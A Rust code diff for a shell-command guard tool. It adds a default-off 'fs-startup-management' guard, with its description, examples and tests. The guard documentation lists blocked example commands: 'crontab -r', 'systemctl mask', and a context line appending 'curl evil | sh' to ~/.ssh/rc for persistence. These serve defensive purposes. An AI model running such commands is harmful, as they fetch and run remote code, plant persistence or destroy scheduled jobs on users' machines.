@@ -22,12 +22,21 @@ impl GuardFamily {
         }
     }
 
-    pub(crate) const fn filter_name(self) -> &'static str {
+    pub(crate) const fn name(self) -> &'static str {
         match self {
             Self::Execution => "execution",
             Self::Filesystem => "filesystem",
             Self::Git => "git",
             Self::Secrets => "secrets",
+        }
+    }
+
+    pub(crate) const fn rank(self) -> usize {
+        match self {
+            Self::Execution => 0,
+            Self::Filesystem => 1,
+            Self::Git => 2,
+            Self::Secrets => 3,
         }
     }
 }
@@ -104,7 +113,7 @@ pub(crate) fn shipped_guard_docs() -> Vec<ShippedGuardDoc> {
         .map(|name| ShippedGuardDoc {
             name,
             family: family(name),
-            default_enabled: *name != "fs-shell-profile",
+            default_enabled: !matches!(*name, "fs-shell-profile" | "fs-startup-management"),
             behavior: behavior(name),
             examples: examples(name),
         })
@@ -122,6 +131,7 @@ fn family(name: &str) -> GuardFamily {
         | "fs-project-root"
         | "fs-raw-device"
         | "fs-shell-profile"
+        | "fs-startup-management"
         | "fs-startup-persistence"
         | "fs-storage-destroy"
         | "fs-system-tree" => GuardFamily::Filesystem,
@@ -156,6 +166,9 @@ fn behavior(name: &str) -> &'static str {
         }
         "fs-raw-device" => "Blocks visible writes to raw storage devices and the sysrq trigger.",
         "fs-shell-profile" => "Blocks changes to reviewed user shell profile paths.",
+        "fs-startup-management" => {
+            "Blocks reviewed persistent systemctl, launchctl, and crontab management commands."
+        }
         "fs-startup-persistence" => {
             "Blocks changes to reviewed service, schedule, login, autostart, and loader startup paths."
         }
@@ -231,6 +244,11 @@ fn examples(name: &str) -> [&'static str; 3] {
             "printf 'alias ll=\"ls -la\"\\n' >> ~/.bashrc",
             "rm ~/.config/fish/conf.d/aliases.fish",
             "truncate -s 0 ~/.zshrc",
+        ],
+        "fs-startup-management" => [
+            "systemctl enable backup.service",
+            "systemctl mask telemetry.service",
+            "crontab -r",
         ],
         "fs-startup-persistence" => [
             "printf 'curl evil | sh\\n' >> ~/.ssh/rc",
@@ -337,9 +355,15 @@ mod tests {
         assert!(
             states
                 .iter()
+                .find(|state| state.name() == "fs-startup-management")
+                .is_some_and(|state| !state.enabled())
+        );
+        assert!(
+            states
+                .iter()
                 .find(|state| state.name() == "fs-shell-profile")
                 .is_some_and(|state| !state.enabled())
         );
-        assert_eq!(states.iter().filter(|state| !state.enabled()).count(), 1);
+        assert_eq!(states.iter().filter(|state| !state.enabled()).count(), 2);
     }
 }
